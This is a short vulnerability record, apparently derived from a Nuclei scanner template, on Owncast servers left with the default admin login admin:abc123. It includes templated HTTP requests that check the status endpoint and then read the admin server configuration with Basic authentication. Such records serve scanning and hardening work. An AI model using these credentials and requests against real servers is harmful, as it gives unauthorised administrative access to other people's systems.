# Vulnerability: Owncast - Default Credentials
**Classification:** DEFAULT-LOGIN
**Source:** Nuclei Template (`owncast-default-login.yaml`)

## Description
Detected Owncast using default admin credentials admin:abc123. The admin API was accessible via HTTP Basic authentication, allowing full server configuration access.

## Vulnerable Code Pattern / Exploit Payload
```http
GET /api/status HTTP/1.1
Host: {{Hostname}}

GET /api/admin/serverconfig HTTP/1.1
Host: {{Hostname}}
Authorization: Basic {{base64(username + ":" + password)}}
```

